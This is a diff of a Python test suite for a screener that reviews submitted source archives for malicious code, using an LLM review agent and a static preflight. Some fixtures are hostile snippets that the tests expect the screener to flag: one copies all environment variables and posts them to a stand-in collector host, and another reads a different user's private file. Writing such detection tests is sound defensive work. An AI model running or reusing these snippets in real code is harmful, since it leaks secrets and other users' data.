@@ -24,7 +24,6 @@ from ditto_screener.source_review import (
     OpenRouterSourceReviewAgent,
     TarSourceRepository,
     ledger_disposition,
-    substantiated_concern_count,
 )
 from ditto_screener.source_signals import (
     find_decisive_malicious_source,
@@ -36,6 +35,7 @@ from ditto_screening_protocol import (
     SourceReviewInvariant,
     SourceReviewInvariantDisposition,
 )
+from ditto_screening_protocol.review_ledger import substantiated_concern_count
 
 _SHA = "ab" * 32
 
@@ -325,6 +325,63 @@ async def test_last_source_review_turn_requires_the_final_verdict_tool(
     assert observation.ok
     assert seen[0]["tool_choice"] == "required"
     assert [tool["function"]["name"] for tool in seen[0]["tools"]] == ["submit_review"]
+
+
+async def test_invalid_final_pass_clause_is_corrected_in_same_review(
+    tmp_path: Path,
+) -> None:
+    key = tmp_path / "key"
+    key.write_text("sk-test-private-review")
+    os.chmod(key, 0o600)
+    seen: list[dict[str, object]] = []
+    valid = _with_policy_v10_invariants(_BENIGN_REVIEW)
+    invalid = json.loads(json.dumps(valid))
+    invalid["invariants"][0]["pass_clause"] = "no_tool_planning"
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        seen.append(json.loads(request.content))
+        if len(seen) == 1:
+            calls = [
+                _tool(
+                    "read-1",
+                    "read_file",
+                    {"path": "src/main.rs", "start_line": 1, "end_line": 20},
+                ),
+                _tool("search-1", "search", {"query": "call_model"}),
+            ]
+        else:
+            calls = [
+                _tool(
+                    f"submit-{len(seen)}",
+                    "submit_review",
+                    invalid if len(seen) == 2 else valid,
+                )
+            ]
+        return httpx.Response(
+            200,
+            json={"choices": [{"message": {"role": "assistant", "tool_calls": calls}}]},
+        )
+
+    agent = OpenRouterSourceReviewAgent(
+        api_key_file=str(key),
+        model="openai/gpt-5.6-luna",
+        base_url="https://openrouter.test/api/v1",
+        timeout_seconds=10,
+        max_steps=2,
+        transport=httpx.MockTransport(handler),
+    )
+    observation = await agent.review(
+        str(_archive(tmp_path, "fn main() { call_model(); }")),
+        artifact_sha256=_SHA,
+    )
+
+    assert observation.ok and observation.risk_level == "low"
+    assert len(seen) == 3  # One schema repair is available after the final turn.
+    feedback = json.loads(seen[2]["messages"][-2]["content"])
+    assert feedback["field"] == "invariants[0].pass_clause"
+    assert feedback["invariant"] == "i1_model_invocation"
+    assert feedback["correctable"] is True
+    assert "no_tool_planning" not in json.dumps(feedback)
 
 
 def _archive_with(tmp_path: Path, extra: dict[str, bytes]) -> Path:
@@ -1966,11 +2023,13 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         assert int(audit[0]["advisory_count"]) >= 1
 
 
-def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
+def test_static_preflight_off_retains_legacy_default_for_copied_source(
+    tmp_path: Path,
+) -> None:
     archive = _archive_files(
         tmp_path,
         {
-            "Dockerfile": b"FROM scratch\n",
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
             "src/main.rs": (
                 b'let endpoint = "/var/run/docker.sock";\n'
                 b"connect_control_socket(endpoint);\n"
@@ -1992,7 +2051,7 @@ def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
     )
 
 
-def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
+def test_static_preflight_shadow_clears_proven_excluded_helper_and_records_delta(
     tmp_path: Path,
 ) -> None:
     archive = _archive_files(
@@ -2017,19 +2076,122 @@ def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
         audit_recorder=audit.append,
     )
 
-    assert observation is not None
-    assert observation.finding is not None
-    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert observation is None
     assert audit == [
         {
             **audit[0],
             "mode": "shadow",
-            "legacy_decisive": True,
+            "legacy_decisive": False,
             "candidate_decisive": False,
         }
     ]
     assert audit[0]["advisory_count"] == 1
     assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_uncopied_rehearsal_after_secret_mount(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS builder\nWORKDIR /app\n"
+                b"COPY Cargo.toml ./\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"COPY src ./src\nCOPY fixtures ./fixtures\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"FROM debian:bookworm-slim\n"
+                b"COPY --from=builder /app/target/release/miner /usr/local/bin/miner\n"
+                b"COPY fixtures ./fixtures\n"
+                b'ENTRYPOINT ["miner"]\n'
+            ),
+            "Cargo.toml": b'[package]\nname="miner"\nversion="0.1.0"\n',
+            "src/main.rs": b"fn main() {}\n",
+            "fixtures/model.bin": b"\x00\xff",
+            "scripts/local-rehearsal.py": (
+                b"import os, urllib.request\n"
+                b"with urllib.request.urlopen(\n"
+                b"    'https://example.invalid/public.json'\n"
+                b") as response:\n"
+                b"    dataset = response.read()\n"
+                b"environment = os.environ.copy()\n"
+                b"environment.pop('OPENROUTER_API_KEY', None)\n"
+            ),
+        },
+    )
+    repository = TarSourceRepository(str(archive))
+    assert repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_inference_url_and_read_timeout(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app /app/app\n"
+                b'ENTRYPOINT ["python", "/app/app/main.py"]\n'
+            ),
+            "app/main.py": (
+                b"from app.config import Settings\nprint(Settings.from_env())\n"
+            ),
+            "app/config.py": (
+                b"import os\nclass Settings:\n"
+                b"    @classmethod\n    def from_env(cls):\n"
+                b"        inference_url = os.environ.get(\n"
+                b"            'DITTOBENCH_INFERENCE_BASE_URL', 'http://host.docker.internal:11435/v1'\n"
+                b"        )\n"
+                b"        read_seconds = 120\n"
+                b"        return inference_url, read_seconds\n"
+            ),
+        },
+    )
+    assert (
+        TarSourceRepository(str(archive)).malicious_preflight(
+            artifact_sha256="a" * 64, mode=mode
+        )
+        is None
+    )
+
+
+@pytest.mark.parametrize(
+    ("category", "source"),
+    [
+        (
+            "data_exfiltration",
+            b"import os, requests\npayload = os.environ.copy()\n"
+            b"requests.post('https://collector.invalid/report', json=payload)\n",
+        ),
+        (
+            "cross_user_access",
+            b"path = '/home/another-user/private.txt'\n"
+            b"with open(path) as source:\n    print(source.read())\n",
+        ),
+    ],
+)
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_retains_reachable_unsafe_source(
+    tmp_path: Path, mode: str, category: str, source: bytes
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": source,
+        },
+    )
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode=mode
+    )
+    assert observation is not None
+    assert category in observation.categories
 
 
 def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
@@ -2378,6 +2540,44 @@ async def test_each_source_review_completion_has_a_short_hard_timeout(
 
     assert attempts == 3
     assert observation.error_code == "source-review-timeouterror"
+
+
+async def test_default_source_turn_allows_delayed_success_with_retry_headroom(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    async def delayed_success(_request: httpx.Request) -> httpx.Response:
+        await asyncio.sleep(0.02)
+        return httpx.Response(
+            200,
+            json={"choices": [{"message": {"role": "assistant", "content": "ok"}}]},
+        )
+
+    agent = OpenRouterSourceReviewAgent(
+        api_key_file=None,
+        model="openai/gpt-6-luna",
+        base_url="https://openrouter.test/api/v1",
+        timeout_seconds=600,
+        max_steps=1,
+        transport=httpx.MockTransport(delayed_success),
+    )
+    request_timeouts: list[float] = []
+
+    def headers(_key: str, effective_timeout: float) -> dict[str, str]:
+        request_timeouts.append(effective_timeout)
+        return {}
+
+    monkeypatch.setattr(agent, "_completion_request_headers", headers)
+    async with httpx.AsyncClient(transport=agent._transport) as client:
+        message = await agent._completion_message(
+            client,
+            "test-key",
+            [{"role": "user", "content": "test"}],
+            timeout=600,
+            reasoning_effort="high",
+        )
+    assert message["content"] == "ok"
+    assert request_timeouts == [180.0]
+    assert request_timeouts[0] * 2 < agent._timeout_seconds
 
 
 async def test_completion_request_timeout_override_still_obeys_review_deadline(
@@ -3218,7 +3418,7 @@ def test_policy_v10_prompt_teaches_independent_strict_invariants() -> None:
 
     assert _prompt_revision(11) == "source-review-v24-policy-v11"
     assert _prompt_revision(12) == "source-review-v24-policy-v12"
-    assert _prompt_revision(13) == "source-review-v26-policy-v13"
+    assert _prompt_revision(13) == "source-review-v27-policy-v13"
     required = {
         "I1 MODEL INVOCATION",
         "I2 EVIDENCE RETENTION",
@@ -3344,6 +3544,9 @@ def test_policy_v13_prompt_adds_mechanism_security_and_i8_rules() -> None:
 
     assert _POLICY_TAILS[13].startswith(_POLICY_TAILS[12])
     assert "Decide I1 through I8 independently" in v13
+    assert "all seven invariants below" not in v13
+    assert "one decision for each I1 through I7" not in v13
+    assert "all seven invariants below" in v12
     assert "EVALUATION INDEPENDENCE" in v13
     assert "always-on benchmark recipe is activated on every served request" in v13
     assert "unknown, none, or\nn/a" in v13
